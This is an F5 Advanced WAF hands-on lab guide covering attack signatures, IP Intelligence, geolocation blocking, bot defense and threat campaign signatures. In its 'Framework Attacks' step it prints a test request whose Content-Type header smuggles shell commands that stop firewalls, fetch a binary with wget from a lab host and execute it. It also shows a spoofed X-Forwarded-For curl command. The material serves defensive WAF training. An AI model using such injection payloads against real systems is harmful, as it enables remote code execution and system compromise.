8. Review all the details and then click the 3 under the **Attack Signature Detected** violation to see all of the staged XSS Attack Signatures that were triggered.

![image](https://user-images.githubusercontent.com/51786870/210517143-d77e7f19-9997-4cd0-b4a9-ce0ce56fb449.png)

### Server Technologies & Attack Signatures
In this final exercise we will examine server technologies which allow you to automatically discover server-side frameworks, web servers and operating systems. This feature helps when the backend technologies are not well known or communicated from the Dev team.

1. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures**
2. Review the Attack Signatures that were applied during policy creation from back in Lab 1. **Generic Detection Signatures (High/Medium Accuracy)**. Notice that they are set to **Learn/Alarm/Block** and **Staging** is enabled.
3. Locate Server Technologies and expand the option. Click **Enable Server Technology Detection**, click **Save** and then click the **New Window Icon** next to Server Technologies.

![image](https://user-images.githubusercontent.com/51786870/210517472-f3b74877-9882-46ff-9a50-d627394e036c.png)

4. Scroll down to Advanced Settings > Server Technologies and click in the box. Search for Linux since we know the server is running Linux. The system will display a box describing which new signature sets will be applied. Click Confirm.

![image](https://user-images.githubusercontent.com/51786870/210517725-420aff8b-5893-4d5f-936a-db18a859ad4b.png)

![image](https://user-images.githubusercontent.com/51786870/210517785-9a193b58-5658-4448-8591-26d4594fa843.png)

6. Make sure to **Save** and **Apply Policy**.
7. Go to **Security > Application Security > Policy Building > Learning and Blocking Settings > Attack Signatures** and notice the new Unix/Linux Server Technology signature sets that were added to the policy.

![image](https://user-images.githubusercontent.com/51786870/210517924-850e02b9-1d07-4d98-a7b1-997e4dfc4362.png)

### Framework Attacks

1. Back in BURP navigate to the repeater tab and adjust the payload to the following and hit Send. Replace password with the password you’ve been using all along

**Framework Attack**
```
POST https://10.1.10.57/#/login HTTP/1.1
User-Agent: BestBrowser
Pragma: no-cache
Cache-Control: no-cache
Content-Type: /etc/init.d/iptables stop; service iptables stop; SuSEfirewall2 stop; reSuSEfirewall2 stop; cd /tmp; wget -c https://10.1.10.145:443/7; chmod 777 7; ./7;
Content-Length: 44
Host: juiceshop.f5demo.com

username=student@f5demo.com&password=student
```

![image](https://user-images.githubusercontent.com/51786870/210518168-1db7f73d-118c-41a2-8d24-9ba6360a80a8.png)


2. Browse to **Security > Event Logs > Application > Requests** and look for the most recent Sev5 Event. Select the event, review the violations and click the 2 under Occurrences for the Attack signature detected violation.

![image](https://user-images.githubusercontent.com/51786870/210518293-2c1ce688-5905-4d25-b737-7638fdc3f0f4.png)

3. Click the little blue i and review the Attack Signature Details. We can see that this was a Systems based Unix/Linux Signature in staging mode.
![image](https://user-images.githubusercontent.com/51786870/210518444-c44a12c2-b2b2-4078-a887-9d84f13dc9b6.png)

4. We are now alerting on attacks aimed at Server Technologies.

**This completes Module 1**




#
#
#
#
#
#
#

# Module 1: IP Intelligence
Expected time to complete: 30 minutes

We created a transparent policy way back in Lab 1 to configure Transparent WAF Policy. We then tested out standard signatures  and now we will explore and test some of the other components that should be in scope for enforcement early on in your WAF deployment.

## Exercise 1.1: IP Intelligence Policies
### Objective

  * Configure Global IPI Profile & Logging
  * Review Global IPI Logs
  * Configure Custom Category and add an IP
  * Implement IPI w/ XFF inspection
  * Estimated time for completion: 30 minutes.

### Create Your 1st L3 IPI Policy
An IPI policy can be created and applied globally, at the virtual server (VS) level or within the WAF policy itself. We will follow security best-practice by applying IPI via a Global Policy to secure Layer 3 device-wide and within the Layer 7 WAF policy to protect the App by inspecting the HTTP X-Forwarded-For Header.  
![image](https://user-images.githubusercontent.com/38420010/119348500-3e893980-bc9d-11eb-8836-e57471dc73a8.png)

In this first lab, we will start by enabling a Global IPI Policy; much like you would do, as a day 1 task for your WAF:  
  
1. RDP to the Linux Client by choosing the RDP access method from your UDF environment page. You will be presented with the following prompt where you will enter the password only. Please use f5student username:

![image](https://user-images.githubusercontent.com/38420010/119348695-83ad6b80-bc9d-11eb-84a6-ad49b8747f0c.png)

2. Once logged in, launch Chrome Browser. You can double-click the icon or right click and choose execute but do not click multiple times. It does take a few moments for the browser to launch the first time.
3. Click the bigip01 bookmark and login to TMUI. It is normal to see a certificate warning that you can safely click through. Or you can use TMUI access via UDF.
4. On the Main tab, click Local Traffic > Virtual Servers and you will see the Virtual Servers that have been pre-configured for your lab. Essentially, these are the listening IP’s that receive requests for your application and proxy the requests to the backend “real” servers.

![image](https://user-images.githubusercontent.com/38420010/119349079-020a0d80-bc9e-11eb-91ed-d77da464c136.png)

  * **insecureApp1_vs** - Main Site - Status of green indicates a healthy backend pool of real servers
  * **security-testing-overlay-vs** - Will be used later to send spoofed traffic to the main site

5. On the Main tab, click Security > Network Firewall > IP Intelligence > Policies.
![image](https://user-images.githubusercontent.com/38420010/119349565-94121600-bc9e-11eb-9588-d95a3e714f33.png)

6. Click on the **Create** button.
7. For the name: **global_ipi**
8. Under **IP Intelligence Policy Properties** For the Default Log Action choose **yes** to **Log Category Matches.**
9. Browse to the inline Help tab at the top left of the GUI and examine the Default Log Action settings. Inline help is very useful when navigating the myriad of options available within any configuration screen.
10. To the right of the screen, click **Add** under the categories section.
11. Repeat this process and add the following additional categories: **phishing, scanners, spam_sources, & denial_of_service**. Outside of this lab, you would want to enable additional categories for protection.

![image](https://user-images.githubusercontent.com/38420010/119351114-69c15800-bca0-11eb-9264-d5ebeeca6c1e.png)

12. Commit the Changes to the System.
13. Under **Global Policy Assignment > IP Intelligence Policy** click on the dropdown and select the **global_ipi** policy and click Update.

### Setup Logging for Global IPI
1. In the upper left of the GUI under the **Main** tab, navigate to **Security > Event Logs > Logging Profiles** and click on **global-network**
2. Under the Network Firewall section configure the IP Intelligence publisher to use **local-db-publisher**
3. Check **Log GEO Events**
4. Click **Update**
![image](https://user-images.githubusercontent.com/38420010/119351448-bf960000-bca0-11eb-8704-5fd25bfb1f29.png)

### Test
1. On the Linux Client, open a terminal and **cd** to **Agility2020wafTools**
2. Run the following command to send some traffic to the site: **./ipi_tester**
`The script should continue to run for the remainder of Lab 1 & 2. Do NOT stop the script.`
3. Navigate to **Security > Event Logs > Network > Ip Intelligence** and review the entries. Notice the Geolocation Data as well as the Black List Class to the right of the log screen.

![image](https://user-images.githubusercontent.com/38420010/119351937-5b277080-bca1-11eb-882e-bb0d893f125b.png)

### Create Custom Category
1. Navigate to: **Security > Network Firewall > IP Intelligence > Blacklist Categories** and click **Create**.
2. Name: **my_bad_ips** with a match type of **Source**
3. Click **Finished**
4. Click the checkbox next to the name **my_bad_ips** and then at the bottom of the GUI, click **Add To Category**.
![image](https://user-images.githubusercontent.com/38420010/119352108-8d38d280-bca1-11eb-8734-52f48cb89621.png)
5. Enter the ip address: **134.119.218.243** or any of the other malicious IP’s showing up in the IP Intelligence logs, and set the seconds to **3600** (1 hour)
6. Click **Insert Entry**
7. Navigate to **Security > Network Firewall > IP Intelligence > Policies** and click **global_ipi**
8. Under **Categories** click **Add** and select your new custom category **my_bad_ips** from the drop-down. Click **Done Editing** and **Commit Changes to System**.
![image](https://user-images.githubusercontent.com/38420010/119352376-e6086b00-bca1-11eb-8c5a-8213f0ea3e55.png)
9. Navigate back to **Security > Event Logs > Network > Ip Intelligence** and review the entries under the column **Black List Class**. You will see entries for your custom category **my_bad_ips**.
![image](https://user-images.githubusercontent.com/38420010/119352409-f1f42d00-bca1-11eb-9885-2f5c43833c35.png)

**This concludes the Layer 3 IPI policy lab section.**  
  
**To recap, you have just configured a Global IP Intelligence policy and added a custom category.
This policy is inspecting Layer 3 only and is a best-practice first step to securing your Application traffic.**  
  

### Configure L7 IPI
1. Navigate to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **IP Addresses and Geolocations** section.
`These are the settings that govern what happens when a violation occurs such as Alarm and Block. We will cover these concepts later in the lab but for now the policy is still transparent so the blocking setting has no effect.`
![image](https://user-images.githubusercontent.com/38420010/119355305-64b2d780-bca5-11eb-8102-9f4e614507e7.png)
2. Navigate to **Security > Application Security > IP Addresses > IP Intelligence** and enable **IP Intelligence** by checking the box.
3. Notice at the top left drop-down that you are working within the webgoat_waf policy context. Enable **Alarm** and **Block** for each category.
![image](https://user-images.githubusercontent.com/38420010/119355409-84e29680-bca5-11eb-8572-5f8809e3ae8e.png)
4. Click **Save** and **Apply Policy**. You will get an “Are you sure” popup that you can banish by clicking **Do not ask for this confirmation again**.
5. Enable XFF inspection in the WAF policy by going to **Security > Application Security > Security Policies > Policies List** > and click on webgoat_waf policy.
6. Finally, scroll down under **General Settings** and click **Enabled** under **Trust XFF Header**.
7. Click **Save** and **Apply Policy**

### Test XFF Inspection
1. Open a new terminal or terminal tab on the Client (the ipi_tester script should still be running) and run the following command to insert a malicious IP into the XFF Header:

```bash
curl -H "X-Forwarded-For: 134.119.218.243" -k https://10.1.10.145/xff-test
```
If that IP has rotated out of the malicious DB, you can try one of these alternates:
* 80.191.169.66 - Spam Source
* 85.185.152.146 - Spam Source
* 220.169.127.172 - Scanner
* 222.74.73.202 - Scanner
* 62.149.29.36 - Spam Source
* 82.200.247.241 - Phishing
* 134.119.219.93 - Spam Source
* 218.17.228.102 - Spam Source
* 220.169.127.172 - Scanner

2. Navigate to **Security > Event Logs > Application > Requests** and review the entries. You should see a Sev3 Alert for the attempted access to uri: **/xff-test** from a malicious IP.
![image](https://user-images.githubusercontent.com/38420010/119356456-bb6ce100-bca6-11eb-91e7-316e32571e48.png)

3. In the violation details you can see the entire request details including the XFF Header even though this site was using strong TLS for encryption.

`Attackers often use proxies to add in source IP randomness. Headers such as XFF are used to track the original source IP so the packets can be returned. In this example the HTTP request was sent from a malicious IP but through a proxy that was not known to be malicious. The request passed right through our Global Layer 3 IPI policy but was picked up at Layer 7 due to the WAF’s capabilities. This demonstrates the importance of implementing security in layers.`

## Exercise 1.2: Add a Geolocation Policy
Another practical control to implement early on in your WAF deployment is Geolocation blocking or fencing. If we know that our application is only supposed to be accessed from certain countries or not accessed from others, now is the time to get that configured and enforced.

`Much like our Layer 7 IPI Policy, with Advanced WAF the Geolocation logic happens at the policy level. You may have many policies each with their own unique configuration per application or you may use a parent policy that has baseline settings.`

### Geolocation
**For demonstration purposes you will now disable the Layer 3 Global IPI policy to ensure Layer 7 Geolocation & IPI events occur.**
1. Browse to **Security > Network Firewall > IP Intelligence > Policies** and set the Global Policy Assignment to **None** and click **Update**.
2. Open **Security > Application Security > Geolocation Enforcement**
3. Select all Geolocations **except the United States and N/A** and move them to Disallowed Geolocations. **Save** and then **Apply Policy**.
![image](https://user-images.githubusercontent.com/38420010/119356800-1ef70e80-bca7-11eb-8486-093801f0641e.png)
`N/A covers all RFC1918 private addresses. If you aren’t dropping them at your border router (layer 3), you may decide to geo-enforce at ASM (Layer 7) if no private IP’s will be accessing the site.`
4. Navigate to **Security > Event Logs > Application > Requests** and review the entries in the event log that contain both IPI and Geolocation violations.
![image](https://user-images.githubusercontent.com/38420010/119356892-3afab000-bca7-11eb-921e-0ff198b705b8.png)
`You can also perform Geolocation Enforcement with LTM policies attached to Virtual Servers even if you are only licensed for Advanced WAF. Blocking decisions made here would not be reflected in the Application Requests WAF Log but can be still be logged.`


**This completes Exercise 1.2

Congratulations! You have just completed Lab 1 by implementing an IPI policy globally at Layer 3 and at Layer 7 via WAF policy for a specific application. Next you added Geolocation Enforcement to the policy and learned that this can be done via WAF policy or LTM policy. This follows our best-practice guidance for getting started with Application Security.**

# Module 2: Bot Defense
Expected time to complete: 20 minutes

## Exercise 2.1: Bot Defense with Signatures

The next logical step in our configuration is to deal with automated traffic. While Advanced WAF has some deep Bot Defense capabilities, we will start with Bot Signatures. A good goal during your initial deployment would be to get transparent BOT profiles deployed across your various application Virtual Servers so you can start to analyze your “normal” loads of automated traffic. This can be very surprising to an organization or a developer that thought they had a lot more “real users”.

### Objective
  * Create a Bot Defense logging profile
  * Create and apply a transparent Bot Defense Profile with Signatures
  * Test and verify logs
  * Add a signature to the whitelist
  * Estimated time for completion: **20 minutes**

### Create Logging Profile
1. Navigate to **Security > Event Logs > Logging Profiles** and click **Create** to a new Logging Profile with the settings shown in the screenshot below. Click **Create**.
![image](https://user-images.githubusercontent.com/38420010/119357266-a775af00-bca7-11eb-9473-232baace0399.png)
2. Navigate to **Security > Bot Defense > Bot Defense Profiles** and click **Create**.
3. Name: **webgoat_bot**
4. Profile Template: **Relaxed**
5. Click the Learn more link to see an explanation of the options. These will be explored further in the 241 lab but for now we are going with **Relaxed** aka **Challenge-Free Verification**.
![image](https://user-images.githubusercontent.com/38420010/119357409-d429c680-bca7-11eb-8889-27572035d2e2.png)
6. Click on the **Bot Mitigation Settings** tab and review the default configuration.
7. Click on the **Signature Enforcement** tab and review the signatures and staging status.
8. Click **Save**.

### Apply the Policy and Logging Profile
1. Navigate to **Local Traffic > Virtual Servers** click on **insecureApp1_vs** then go to the **Security Tab > Policies** (top middle of screen).
`To clearly demonstrate just the Bot Defense profile, please disable all security policy on the virtual server. The ipi_tester script should still be running!`
2. Navigate to **Local Traffic > Virtual Servers > insecureApp1_vs > Security > Policies** and disable the **Application Security Policy** and **enable the Bot Defense Profile** and **Bot_Log Profile**.
3. Click **Update**

![image](https://user-images.githubusercontent.com/38420010/119358317-c759a280-bca8-11eb-9725-f60b6ddbe1c4.png)

4. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs. Notice curl (the bot being used in our ipi_tester script) is an untrusted bot in the HTTP Library category of Bots.

![image](https://user-images.githubusercontent.com/38420010/119358572-0556c680-bca9-11eb-812f-248f097248fb.png)

5. On the top middle of the screen under the **Bot Defense** Tab, click on **Bot Traffic** for a global view of all Bot Traffic. In this lab we only have one site configured.

![image](https://user-images.githubusercontent.com/38420010/119358885-55ce2400-bca9-11eb-920e-8bfd37fee102.png)

6. Click on the **insecurApp1_vs** Virtual Server and explore the analytics available under **View Detected Bots** at the bottom of the screen.

![image](https://user-images.githubusercontent.com/38420010/119358826-4bac2580-bca9-11eb-903c-338599a74cf2.png)

### Whitelisting a Bot & Demonstrating Rate-Limiting¶
1. Navigate to **Security > Bot Defense > Bot Defense Profiles > juiceshop_bot > Bot Mitigation Settings**
2. Under **Mitigation Settings** change Unknown Bots to **Rate Limit** with a setting of **5** TPS. **5** is a very aggressive rate-limit and used for demo purposes in this lab.
`In the “real world” you will need to set this to a value that makes sense for your application or environment to ensure the logs do not become overwhelming. If you don’t know, it’s usually pretty safe to start with the default of 30.`
3. Under **Mitigation Settings Exceptions** click **Add Exceptions** and search for curl and click **Add**.
![image](https://user-images.githubusercontent.com/38420010/119359128-95950b80-bca9-11eb-9ece-4c4fd8cf5bfd.png)
4. Change the Mitigation Setting to **None** and then **Save** the profile.
![image](https://user-images.githubusercontent.com/38420010/119359150-9a59bf80-bca9-11eb-8434-04d89bd71af8.png)
5. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs.
6. Notice the whitelisted bot’s class was changed to unknown and we set curl to not alarm but the requests are still being alarmed. What gives?
![image](https://user-images.githubusercontent.com/38420010/119359260-ba897e80-bca9-11eb-9779-90a60e904923.png)
7. Click the down arrow under **Mitigation Action** and note the reason for the alarm.
`Even though we have whitelisted this bot we can still ensure that it is rate-limited to prevent stress on the application and any violations to that rate-limit will be Alarmed. This bot is currently violating the rate-limit of 5 TPS.`

![image](https://user-images.githubusercontent.com/38420010/119359356-d1c86c00-bca9-11eb-8033-94a3164e3879.png)

### Testing Additional User-Agents
1. Navigate to **Local Traffic > Virtual Servers > Virtual Server List > security-testing-overlay-vs > Resources** tab and under **iRules** click **Manage** and add the **ua_tester** iRule and click **Finished**.
![image](https://user-images.githubusercontent.com/38420010/119359583-12c08080-bcaa-11eb-963f-6c424263b000.png)
`What you just added is an iRule that inserts poorly spoofed User-Agents. Our ipi_tester script has been sending traffic through this Virtual Server all along and spoofing source IP’s to the main site via the ipi_tester iRule.`
2. Navigate to **Security > Event Logs > Bot Defense > Bot Requests** and review the event logs.
3. All the **Unknown** bots are getting rate-limited and the known browsers that do not match the appropriate signatures, such as the spoofed Safari request in this example, are being marked as **Suspicious or Malicious**.

**This completes Lab 2**
  
**Congratulations! You have just completed Lab 2 by implementing a signature based bot profile. Implementing bot signatures is the bare minimum for bot mitigation and not a comprehensive security strategy. This is a excellent step in getting started with WAF and will provide actionable information on automated traffic. You can use this information to take next steps such as implementing challenges and blocking mode. At a very minimum, share this information with your Application teams. Automated traffic can negatively affect the bottom line especially in cloud environments where it’s pay to play. See our 241 class on Elevated WAF Security for more info on advanced bot mitigation techniques.**

# Module 3: Threat Campaigns¶
Expected time to complete: 20 minutes

## Exercise 3.1: Threat Campaigns
Threat Campaign signatures are subscription based and sourced from a variety of threat intel sources based on real world campaigns to attack and/or take over resources. Attackers are constantly looking for ways to exploit the latest vulnerabilities and/or new ways to exploit old vulnerabilities. F5’s Threat Research team is constantly monitoring malicious activity around the globe and creating signatures specific to these exploits. These Threat Campaign signatures are based on current “in-the-wild” attacks. Threat Campaign signatures contain contextual information about the nature and purpose of the attack.

As an example, a normal WAF signature might tell you that SQL injection was attempted. A Threat Campaign signature will tell you that a known threat actor used a specific exploit of the latest Apache Struts vulnerability (CVE -xxxx) in an attempt to deploy ransomware for cryptomining software.

### Objective
  * Prep the Virtual Server
  * Review TC Signatures
  * Review Learning/Blocking settings and Staging Concept
  * Launch Attack
  * Test and verify logs
  * Estimated time for completion: 20 minutes

### Prep the Virtual Server
These steps are necessary for this demonstration. In the “real world” having the Bot Defense Profile pick up this type of attack coming from a tool, not a browser, would be preferred, going back to the layered security approach.

1. Navigate to **Local Traffic > Virtual Servers > Virtual Server List > insecureApp1_vs > Security > Policies**.
2. Enable the **Application Security Policy: webgoat_waf**. Threat Campaign Signatures are part of your WAF policy.
3. **Disable the Bot Defense Profile**. We are removing the bot profile since we will be using a “Bot” to test the Threat Campaign signatures.
4. **Remove the Bot_Log profile** and click **Update**. Your virtual should look like this:

![image](https://user-images.githubusercontent.com/38420010/119360891-5ebff500-bcab-11eb-9921-6a15bd53f2e9.png)

### Review TC Signatures
1. Navigate to **System > Software Management > Live Update > Threat Campaigns**. DO NOT update the system but note the Installation History. You can also view the Bot Signatures and other signature packages that are currently installed or pending.
`Without an Advanced WAF license and Threat Campaign Subscription you will NOT get Live Updates for Bot Signatures.`
2. Navigate to **Security > Options > Application Security > Threat Campaigns** and review some of the signatures and information about them.
3. Click on the **Apache Struts2 Jakarta Multipart Parser BillGates** signature and note the attack type as well as the CVE reference: **CVE-2017-5638**. You can click the CVE reference link for more information.
4. Click on the filter button and under the Reference field, type: **2020** and **Apply Filter** to search for all CVE’s related to 2020.
![image](https://user-images.githubusercontent.com/38420010/119361128-9b8bec00-bcab-11eb-8deb-56a7bb4d9672.png)

### Review TC Learning and Blocking Settings
1. Navigate to **Security > Application Security > Policy Building > Learning and Blocking Settings** and expand the **Threat Campaigns** section.
2. Note that the system is set to **Alarm** and **Block** on signature matches. Remember, our policy is in transparent mode so the blocking setting will not have any effect.
![image](https://user-images.githubusercontent.com/38420010/119361221-b5c5ca00-bcab-11eb-96ba-d3be2be65fca.png)
`Staging and the Enforcement Readiness period means that when new signatures are downloaded, if staging is enabled, the system will wait until the enforement readiness period is over before it starts blocking. You will still see alarms during this period. Due to the high accuracy nature of Threat Campaign signatures, the default system configuration is to have Staging turned off so new signatures go into effect immediately.`


### Test TC Signatures and Review Logs
`Please ensure the ipi_tester script is not running in the terminal on the Linux Client. If it is, you can strop it with Ctrl+C`
1. From the Linux Client, confirm that the ipi_tester script is not running in the terminal and launch **Postman** from the Desktop. **It takes a few moments for Postman to launch**.
![image](https://user-images.githubusercontent.com/38420010/119361378-e1e14b00-bcab-11eb-9766-16f63afb8f1b.png)
2. You will see a collection called **Threat Campaigns** and within, an item called **test_req**. This simply tests that the site is responding.
3. Click on **test_req** and then click the blue **Send** button on the top right. If your output does not look like this, please let a lab instructor know.
![image](https://user-images.githubusercontent.com/38420010/119363569-3b4a7980-bcae-11eb-9a87-93defc9bb83e.png)
4. Click on the **Fortinet SSL VPN** attack and then click the blue **Send** button. Repeat this process for the **Oracle2** attack. Explore the http headers and bodies being sent. If your policy was in blocking mode you would receive a block page but since the policy is transparent, these attacks are making it through and the juiceshop page is returned.
5. Back in Advanced WAF, navigate to **Security > Event Logs > Application > Requests** and review the Sev5 events.
![image](https://user-images.githubusercontent.com/38420010/119363772-7a78ca80-bcae-11eb-890c-83f3eb1c8f17.png)
6. Click on the event for **/remotefgt_lang** and note the triggered violations. Click on **All Details** to the right of the screen to get more information. You can also click the **Open to new tab** icon in the top right to get an isolated view of this violation.
![image](https://user-images.githubusercontent.com/38420010/119363841-8ebcc780-bcae-11eb-8f2d-fc593edba67f.png)
7. When working in the WAF Requests event viewer, you can see exactly which Attack Signatures or Threat Campaigns were triggered under the **Violations** section. Click the **Numerical Value** under **Occurrences** for **Threat Campaign detected**.
![image](https://user-images.githubusercontent.com/38420010/119363924-a7c57880-bcae-11eb-9227-3dca7d61103a.png)
8. Notice that the there were actually 2 Threat Campaigns Signatures that triggered and you can see the Applied Blocking Setting of **Alarm**
9. Click the little blue info icon next to one of the Threat Campaign Signatures for more information.
![image](https://user-images.githubusercontent.com/38420010/119363967-b57afe00-bcae-11eb-8cc2-a589b7f81928.png)
10. Review the other alert that we generated from Postman and explore any additional Attack Signatures that were fired. In this instance, a Malformed XML Data signature that was enabled as part of our Rapid Deployment Policy also picked up the attack.
![image](https://user-images.githubusercontent.com/38420010/119364022-c461b080-bcae-11eb-9f6d-177b7995574f.png)
11. Navigate to **Security > Event Logs > Application > Event Correlation** and explore the Dashboard.
12. Click on the **Threat Campaign** incident and then click on **Export Incident** and review the generated report.

![image](https://user-images.githubusercontent.com/38420010/119364311-0ab70f80-bcaf-11eb-98e5-d3f1d3382548.png)

**This completes Lab 3**

**Congratulations! You just completed Lab 3 and have continued your introductory knowledge to Advanced WAF with Threat Campaign Signatures. These powerful and highly-accurate signatures are a great first step into enforcing blocking as they produce virtually no false positives.**



**Congratulations! It was a long road but you made it though and now have the knowledge to go forth and start testing. Given the Advanced WAF is a proxy, you could build a Virtual Edition F5 locally on your machine and implement a number of test scenarios with no impacts to a production application. Contact your friendly neighborhood F5 Solutions Engineer for more information!! Hope to see you in the 241 Elevated WAF Protection class! Cheers!!!**
































































